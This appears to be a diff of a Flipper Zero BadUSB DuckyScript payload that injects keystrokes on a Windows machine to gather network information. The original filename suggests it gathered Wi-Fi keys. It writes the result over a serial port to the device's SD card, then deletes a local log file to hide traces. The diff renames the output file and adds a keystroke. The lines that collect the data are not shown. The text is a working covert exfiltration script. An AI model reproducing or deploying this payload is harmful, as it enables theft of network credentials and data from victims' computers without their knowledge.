@@ -1,4 +1,3 @@
-REM 
 REM TITLE: NETWORK INFO EXFILL TO FLIPPER ZERO SD CARD.
 DELAY 1000
 GUI r
@@ -22,7 +21,7 @@ REM ## The VendorID and ProductID to search. If you'd change the BadUSB IDs in t
 STRING $BHID="HID\\VID_046D\&PID_C529";
 STRING $SUSB="USB\\VID_0483\&PID_5740";
 REM ## The trorage Path where the result is SPATHed at the Flipper Zero SD card
-STRING $SPATH="/ext/apps_data/WiFiKeys_$env:computername.txt"
+STRING $SPATH="/ext/apps_data/NetworkInfo_$env:computername.txt"
 ENTER
 DELAY 500
 STRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID 'USB\VID_0483&PID_5740*') -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{Sleep 1}};
@@ -32,3 +31,4 @@ DELAY 1000
 STRING Remove-Item -Path $home\Log.txt
 ENTER
 STRING EXIT
+ENTER
